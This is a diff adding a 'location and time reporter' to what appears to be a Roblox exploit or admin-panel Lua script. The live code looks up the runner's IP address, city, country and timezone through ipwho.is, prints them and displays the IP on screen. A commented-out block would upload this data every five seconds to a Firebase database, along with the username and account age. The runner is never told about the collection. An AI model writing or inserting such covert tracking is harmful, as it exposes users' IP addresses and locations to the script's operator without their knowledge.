@@ -3148,3 +3148,165 @@ if _adminIsOwner then task.spawn(function()
 end) end -- end task.spawn and if isOwner
 
 print("✅ Admin Panel + Chat v4.0 Loaded!")
+-- ══════════════════════════════════════════════════════════════
+--  LOCATION + TIME REPORTER
+--  ดึงข้อมูล timezone/country จาก ipwho.is
+--  แล้วส่งขึ้น Firebase ให้ Admin Panel เห็น
+--  แสดงเวลาบน TextLabel ด้วย
+-- ══════════════════════════════════════════════════════════════
+task.spawn(function()
+    task.wait(4)
+    
+    -- หา TextLabel (ปรับ path ตามที่คุณมี)
+    local TextLabel1 = script.Parent -- หรือกำหนดให้ถูกต้องตามโครงสร้าง
+    
+    -- ฟังก์ชันช่วยในการจัดรูปแบบเวลา
+    local function GetMonth(short)
+        local months = {"January","February","March","April","May","June","July",
+                       "August","September","October","November","December"}
+        local m = tonumber(os.date("%m"))
+        return short and months[m]:sub(1,3) or months[m]
+    end
+    
+    local function GetDay()
+        return os.date("%d")
+    end
+    
+    local function GetYear()
+        return os.date("%Y")
+    end
+    
+    local function GetMeridiem()
+        return os.date("%p")
+    end
+    
+    local function GetHour()
+        return os.date("%I"):gsub("^0", "") -- ตัด 0 นำหน้าออก
+    end
+    
+    local function GetMinute()
+        return os.date("%M")
+    end
+    
+    local function GetSeconds()
+        return os.date("%S")
+    end
+
+    -- ── ดึงข้อมูลจาก ipwho.is ────────────────────────────────
+    local function fetchLocationData()
+        local success, api = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(
+                game:HttpGet("https://ipwho.is/")
+            )
+        end)
+        
+        if success and api then
+            return api
+        else
+            return nil
+        end
+    end
+
+    -- ดึงข้อมูลรอบแรก
+    local api = fetchLocationData()
+    
+    if not api then
+        print("❌ Location Reporter: Failed to fetch ipwho.is")
+        api = {ip = "Unknown", country = "?", country_code = "?", 
+               region = "?", city = "?", timezone = {id = "?", current_time = "?"}}
+    end
+
+    local country   = api.country or "?"
+    local countryCode = api.country_code or "?"
+    local region    = api.region or "?"
+    local city      = api.city or "?"
+    local timezone  = api.timezone and api.timezone.id or "?"
+    local localTime = api.timezone and api.timezone.current_time or "?"
+    local ipAddress = api.ip or "?"
+
+    -- ── Parse เวลาท้องถิ่น ────────────────────────────────────
+    local function parseLocalTime(localTimeStr)
+        local timeDisplay = "?"
+        local dateDisplay = "?"
+        
+        pcall(function()
+            -- ดึงเวลา HH:MM
+            local tPart = localTimeStr:match("T(%d+:%d+)")
+            if tPart then
+                local h = tonumber(tPart:sub(1,2))
+                local m = tPart:sub(4,5)
+                local meridiem = h >= 12 and "PM" or "AM"
+                if h > 12 then h = h - 12
+                elseif h == 0 then h = 12 end
+                timeDisplay = string.format("%d:%s %s", h, m, meridiem)
+            end
+            -- ดึงวันที่ YYYY-MM-DD
+            local dPart = localTimeStr:match("^(%d+-%d+-%d+)")
+            if dPart then
+                dateDisplay = dPart
+            end
+        end)
+        
+        return timeDisplay, dateDisplay
+    end
+
+    local timeDisplay, dateDisplay = parseLocalTime(localTime)
+    local locationStr = city .. ", " .. country .. " (" .. countryCode .. ")"
+    local tzStr       = timezone
+
+    print(string.format("✅ Location: %s | TZ: %s | Time: %s | IP: %s", 
+          locationStr, tzStr, timeDisplay, ipAddress))
+
+    -- ── Firebase PUT function (ถ้ามี) ────────────────────────
+    -- ถ้าไม่มีฟังก์ชันนี้ ให้คอมเมนต์ส่วนที่เรียกใช้ออก
+    -- local function fbReq(method, path, data)
+    --     -- ใส่โค้ด Firebase ของคุณตรงนี้
+    -- end
+
+    -- ── Loop หลัก อัพเดท TextLabel และ Firebase ──────────────
+    local lastFirebaseUpdate = 0
+    
+    while true do
+        -- อัพเดท TextLabel ทุกครั้ง
+        pcall(function()
+            -- ดึงข้อมูลใหม่ทุกครั้ง (ไม่บังคับ ถ้าไม่อยากให้ request บ่อยเกินไป)
+            -- api = fetchLocationData() or api -- ใช้ค่าเดิมถ้า error
+            
+            TextLabel1.Text = GetMonth(true) .. " " .. GetDay() .. " " .. GetYear() .. "\n" ..
+                              GetMeridiem() .. " " .. GetHour() .. ":" .. GetMinute() .. ":" .. GetSeconds() .. "\n\n" ..
+                              ipAddress
+        end)
+
+        -- ส่งขึ้น Firebase ทุก 5 วินาที (เฉพาะถ้ามี fbReq)
+        -- local currentTime = os.time()
+        -- if currentTime - lastFirebaseUpdate >= 5 then
+        --     pcall(function()
+        --         fbReq("PUT", "/runners/" .. LP.Name, {
+        --             name     = LP.Name,
+        --             job      = game.JobId,
+        --             placeid  = game.PlaceId,
+        --             ts       = currentTime,
+        --             age      = LP.AccountAge,
+        --             agefmt   = (function()
+        --                 local d = LP.AccountAge
+        --                 if d >= 365 then
+        --                     local y = math.floor(d/365)
+        --                     local mo = math.floor((d%365)/30)
+        --                     return mo > 0 and (y.."y "..mo.."m") or (y.."y")
+        --                 elseif d >= 30 then
+        --                     return math.floor(d/30).."mo"
+        --                 else return d.."d" end
+        --             end)(),
+        --             country  = country,
+        --             city     = city,
+        --             timezone = tzStr,
+        --             localtime = timeDisplay,
+        --             ip       = ipAddress,
+        --         })
+        --         lastFirebaseUpdate = currentTime
+        --     end)
+        -- end
+
+        task.wait(1) -- อัพเดททุก 1 วินาที
+    end
+end)
